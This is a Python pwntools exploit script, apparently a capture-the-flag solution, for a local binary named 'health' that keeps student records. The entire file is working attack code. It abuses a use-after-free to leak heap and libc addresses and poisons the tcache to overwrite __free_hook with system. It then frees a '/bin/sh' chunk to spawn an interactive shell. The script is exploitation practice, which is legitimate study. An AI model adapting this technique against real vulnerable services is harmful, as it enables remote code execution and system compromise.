from pwn import*
import re
context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def choice(idx):
    io.sendlineafter('plz input your choice> ',str(idx))

def register(name):
    choice(1)
    io.sendafter('input your name',name)

def punch(no,size,content):
    choice(2)
    io.sendlineafter('please input your student no.',str(no))
    io.sendlineafter('please input content size!',str(size))
    io.sendafter('please input content',content)


def manager_show(no):
    choice(3)
    io.sendlineafter('plz input your choice>',str(1))
    io.sendlineafter('please inputs review student no',str(no))

def manager_free(no):
    choice(3)
    io.sendlineafter('plz input your choice>',str(2))
    io.sendlineafter('please inputs delete student no',str(no))
    io.sendlineafter('plz input your choice>',str(4))

def manager_modify(no,idx,size,content):
    choice(3)
    io.sendlineafter('plz input your choice>',str(3))
    io.sendlineafter('please inputs modify student no',str(no));
    if(idx >0 ):
        for i in range(idx-1):
            io.sendlineafter('Is this your want to modify infomation?(y/n)','n');
    io.sendlineafter('Is this your want to modify infomation?(y/n)','y');
    io.sendlineafter('please input content size!',str(size))
    io.sendafter('please input content',content)
    io.sendlineafter('plz input your choice>',str(4))
    

if __name__ == "__main__":
    global io
    io = process('./health')

    #skip tocken check
    #
    for i in range(1):
        register("xxxxxx\n")
    

    punch(0,0x68,'aaa\n')

    
    for i in range(16):
        register("/bin/sh\n")

    punch(1,0x68,'bbb\n')
    manager_free(0)
    manager_free(1)

    manager_show(1)

    leak = io.recvuntil('1.statistic')

    leak=u64(re.findall(b'student:(.*)\n',leak)[0].ljust(8,b'\x00'))-0x260
    
    log.info('leak heap=> %s',hex(leak))
    

    io.sendlineafter('plz input your choice>',str(4))

    manager_modify(1,1,0x8,p64(leak+0x10))
    
    
    punch(2,0x68,'aaa\n')
    payload = p64(0x0707070707070707)*8

    punch(3,0x68,payload+b'\n')

    
    manager_free(3)
    
    manager_show(3)

    leak = io.recvuntil('1.statistic')

    leak=u64(re.findall(b'information: (.*)\n',leak)[0].ljust(8,b'\x00'))
    
    log.info('leak libc=> %s',hex(leak))

    libc_base = leak - (0x7f8e80257ca0-0x7f8e7fe6c000)

    io.sendlineafter('plz input your choice>',str(4))

    payload =p64(0x0707070707000001)+p64(0x0707070707070707)*7 + p64(libc.sym['__free_hook']+libc_base)
    manager_modify(3,1,0x68,payload+b'\n')

    punch(4,0x8,p64(libc.sym['system']+libc_base))

    # get sh
    choice(3)
    io.sendlineafter('plz input your choice>',str(2))
    io.sendlineafter('please inputs delete student no',str(4))
    #attach(io)


    io.interactive()
